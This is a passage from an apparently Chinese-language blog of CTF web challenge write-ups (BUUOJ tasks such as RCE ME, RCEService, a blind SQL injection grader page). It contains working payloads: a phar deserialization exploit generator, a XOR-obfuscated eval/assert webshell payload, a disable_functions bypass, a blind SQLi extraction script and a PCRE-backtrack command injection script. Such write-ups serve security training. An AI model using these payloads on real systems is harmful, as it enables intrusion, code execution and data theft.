<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æœ€ä¸‹é¢æœ‰ä¸€ä¸ª<code>file_get_contents</code>ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æ‹¿flagçš„åœ°æ–¹ï¼Œä½†æ˜¯è¦å…ˆè·‘close()æ–¹æ³•ï¼Œè¿™é‡Œçœ‹åˆ°ä¸Šé¢çš„Userç±»ï¼Œè¿™é‡Œæ‰§è¡Œ__destruct()æ–¹æ³•åä¼šæ‰§è¡Œä¸€ä¸ª$this-&gt;db-&gt;close()ï¼Œä½†æ˜¯Useré‡Œå¹¶æ²¡æœ‰close()æ–¹æ³•ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä»è¿™é‡Œè°ƒç”¨close()æ–¹æ³•ï¼Œç„¶åçœ‹åˆ°FileList()ç±»ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª__callæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿Userç±»ä¸­çš„$db = new FileList()ï¼Œè¿™æ ·å°±ä¼šæ‰§è¡ŒFileListä¸­çš„__callæ–¹æ³•ï¼Œè¿›è€Œæ‰§è¡Œclose()ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„æ˜¯Fileä¸­çš„closeï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿FileListä¸­çš„$files = array(new File())ï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨Fileä¸­çš„closeæ–¹æ³•äº†</p><p>æœ€ç»ˆçš„exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">// è¿™é‡Œçš„GIF89aæ˜¯ä¼ªé€ gif</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$object</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>ç„¶åç”±äºdownloadé‡ŒæŠŠflagè¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»deleteé‡Œè·‘pharæµ</p><p><img src="https://i.loli.net/2021/04/24/zuUbQ74EipNXfS1.png"></p><p>å°±å¯ä»¥æ‹¿åˆ°flagäº†</p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>ctrl+Uå‘ç°æºä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123; <span class="comment">// åˆ¤æ–­æœ‰æ— _</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123; <span class="comment">// åˆ¤æ–­æœ‰æ— 23333</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹åˆ’çº¿å¯ä»¥ç”¨%20ç»•è¿‡ï¼Œ<a href="https://www.freebuf.com/articles/web/213359.html">åŸç†åœ¨è¿™</a>ï¼Œè€Œå­—ç¬¦ä¸²å¯ä»¥ç”¨%0aç»•è¿‡ï¼Œtips: %0aä¸ºurlç¼–ç åçš„æ¢è¡Œç¬¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b%<span class="number">20</span>u%<span class="number">20</span>p%<span class="number">20</span>t%<span class="number">20</span>=<span class="number">23333</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°ä¸€ä¸ªsecrettw.phpï¼Œ</p><p><code>Flag is here~But how to get it?Local access only! Sorry,you don&#39;t have permission! Your ip is :sorry,this way is banned!</code></p><p>ctrl+UæŸ¥çœ‹æºç å¯ä»¥å‘ç°ä¸€å¤§ä¸²JSfuckä»£ç ï¼Œ<a href="https://blog.csdn.net/qq_36539075/article/details/79946099?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161952195616780264035600%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161952195616780264035600&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-79946099.first_rank_v2_pc_rank_v29&utm_term=jsfuck">åŸç†çœ‹è¿™</a>ï¼Œç„¶åå¾—åˆ°<code>post me Merak</code>ï¼Œpostä¼ å‚å¾—åˆ°ä¸€ä¸²phpä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†ä¸€ä¸ªchangeå‡½æ•°ç”¨æ¥è¿‡æ»¤å‚æ•°ï¼Œæ‰€ä»¥åè¿‡å»æ„é€ ä¸€ä¸ªflag.phpå°±å¥½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$er</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$er</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ch</span> .= chr(ord(<span class="variable">$er</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span> * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/27/3tuBYJGKLRkWyVC.png"></p><p>å¾—åˆ°flag</p><blockquote><p>flag{9248d40f-8f53-42ff-96c4-801f863b7783}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><p>é¢˜ç›®ç»™å‡ºäº†æºä»£ç ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯ä¸€é“40å­—çš„RCEé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨å¼‚æˆ–è¿›è¡Œæ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="variable">$_</span>=%<span class="number">27</span>`&#123;&#123;&#123;%<span class="number">27</span>^%<span class="number">27</span>?%<span class="number">3</span>C%<span class="number">3</span>E/%<span class="number">27</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">22</span>l%<span class="number">22</span>])</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥ç”¨èšå‰‘ç™»é™†è¿›å»ï¼Œç›´æ¥è¯»flagå‘ç°è¯»ä¸å‡ºæ¥ï¼ŒæŸ¥äº†ä¸‹å‘ç°å¯ä»¥ç”¨ä¸€ä¸ªbypass disable_functionsæ’ä»¶</p><p>é€‰æ‹©PHP7_GC_UAFæ¨¡å¼</p><p><img src="https://i.loli.net/2021/04/27/pEDXtquYRdMmaLv.png"></p><p>ç„¶åè¿›å…¥åˆ°è™šæ‹Ÿç»ˆç«¯ç›´æ¥è¯»readflag</p><p><img src="https://i.loli.net/2021/04/27/kGsCcqQb2XxZHS8.png"></p><p>æœ€åå³å¯å¾—åˆ°flag</p><blockquote><p>flag{43b277ae-fc71-49ac-8350-265816ba9161}</p></blockquote><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>ç®€å•çš„å¸ƒå°”ç›²æ³¨</p><p>è¿™é‡Œç›´æ¥æ”¾è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b09bacde-3fcf-4429-a2d2-6d099630fc8a.node3.buuoj.cn/?stunum=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetData</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        Left = <span class="number">32</span></span><br><span class="line">        Right = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> Left &lt; Right:</span><br><span class="line">            content = <span class="string">&quot;select/**/group_concat(concat_ws(0x7e,/**/value))/**/from/**/flag&quot;</span></span><br><span class="line">            mid = <span class="built_in">int</span>((Left + Right) / <span class="number">2</span>)</span><br><span class="line">            sql = <span class="string">f&quot;if((ascii(substr((<span class="subst">&#123;content&#125;</span>),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),1,0)&quot;</span></span><br><span class="line">            res = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                Right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;Left new is: &#123;Left&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># print(f&quot;Right new is: &#123;Right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((Left + Right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">f&quot;The Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GetData()</span><br></pre></td></tr></table></figure><p>ç›´æ¥çˆ†å‡ºflag</p><blockquote><p>flag{b8a8d39f-41c5-49d8-8f8f-80a3bd78e244}</p></blockquote><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>è¿›å…¥é¢˜ç›®è¯´è¦ç™»å…¥ä¸€ä¸ªadminè´¦æˆ·ï¼Œæ³¨æ„è¿™é‡Œæœ‰ä¸€å¥</p><p><code>We found the account cookie/ monster</code></p><p>è¯•ä¸‹username=cookieï¼Œpassword=monsterï¼ŒæˆåŠŸç™»å…¥ï¼Œä½†æ˜¯æ˜¯ç”¨çš„cookieè´¦æˆ·ç™»å…¥çš„ã€‚</p><p>è¿™é‡ŒæŠ“åŒ…æ”¹æˆadminå³å¯å¾—åˆ°flag</p><blockquote><p>flag{c9db885c-078b-491f-871d-22bb4b6f3a04}</p></blockquote><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>è¿›å…¥é¢˜ç›®åè¦æ±‚è¾“å…¥JSONä»£ç </p><p>ç›´æ¥rce, </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=&#123;%0a<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%0a&#125;</span><br></pre></td></tr></table></figure><p>åŸå› ï¼š</p><p>ç”±äºpreg_matchåªè¯»ä¸€è¡Œï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨%0a(æ¢è¡Œç¬¦)è¿›è¡Œç»•è¿‡</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥åˆ©ç”¨PCREçš„å›æº¯æ¬¡æ•°é™åˆ¶è¿›è¡Œç»•è¿‡ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">åŸç†åœ¨è¿™</a></p><p>æ‰€ä»¥å’±ä»¬å¯ä»¥æ„é€ è„šæœ¬è¿›è¡Œæ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://be96ec7d-da8b-4fef-b553-0d08a4bca0a5.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>: payload&#125;)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°flag</p><h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><h3 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h3><p>åœ¨robots.txté‡Œå‘ç°äº†ä¸€ä¸ª<code>*.php.bak</code>ã€‚</p><p>ç›´æ¥ä¸‹è½½å¤‡ä»½æ–‡ä»¶<code>image.php.bak</code>ã€‚</p><p>å¾—åˆ°<code>image.php</code>çš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] : <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span> = addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span 